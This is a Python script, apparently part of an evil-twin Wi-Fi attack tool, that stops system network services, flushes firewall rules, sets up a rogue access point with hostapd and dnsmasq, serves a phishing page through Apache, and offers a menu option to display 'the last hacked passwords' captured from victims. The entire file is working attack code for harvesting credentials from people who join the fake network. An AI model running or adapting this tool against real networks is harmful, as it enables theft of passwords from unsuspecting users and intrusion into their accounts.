import os
import sys
import time
from attack_manager import do_command

sniffer_interface = sys.argv[1]
network_name = sys.argv[2]

# release port 53
do_command('systemctl disable systemd-resolved.service')
do_command('systemctl stop systemd-resolved')

do_command('service NetworkManager stop')

# AP with address 10.0.0.1 with free 8 bits
ifconfig = "ifconfig " + sniffer_interface + " 10.0.0.1 netmask 255.255.255.0"

do_command('airmon-ng check kill')
do_command(ifconfig)
# create fake gw
do_command('route add default gw 10.0.0.1')

# enable ip forwarding
do_command('echo 1 > /proc/sys/net/ipv4/ip_forward')

# clear firewall ruled which might block some request
do_command('iptables --flush')
do_command('iptables --table nat --flush')
do_command('iptables --delete-chain')
do_command('iptables --table nat --delete-chain')

# enable forwarding
do_command('iptables -P FORWARD ACCEPT') #


line = "python3 create_files.py " + sniffer_interface + " " + network_name
do_command(line)


# start the AP
do_command('dnsmasq -C dnsmasq.conf')
do_command('hostapd hostapd.conf -B')


# start the server for to broadcast our default page
do_command('service apache2 start')
do_command('route add default gw 10.0.0.1') # create fake gw
time.sleep(1)
print('---> Phishing page loaded \n')


while True:
    inp = input("for close fake ap -press 1\nfor showing the last hacked passwords press 2\n")
    if inp == "1":
        try:
            print("removing dnsmasq.conf")
            os.remove("dnsmasq.conf")
        except OSError:
            print("removing dnsmasq.conf failed")
        try:
            print("removing hostapd.conf")
            os.remove("hostapd.conf")
        except OSError:
            print("removing hostapd.conf failed")

        # cleaning
        do_command('service NetworkManager start')
        do_command('service hostapd stop')
        do_command('service apache2 stop')
        do_command('service dnsmasq stop')
        do_command('service rpcbind stop')
        do_command('killall dnsmasq')
        do_command('killall hostapd')
        do_command('systemctl enable systemd-resolved.service')
        do_command('systemctl start systemd-resolved')
        break
    elif inp == "2":
        do_command('python3 read_pass_file.py')
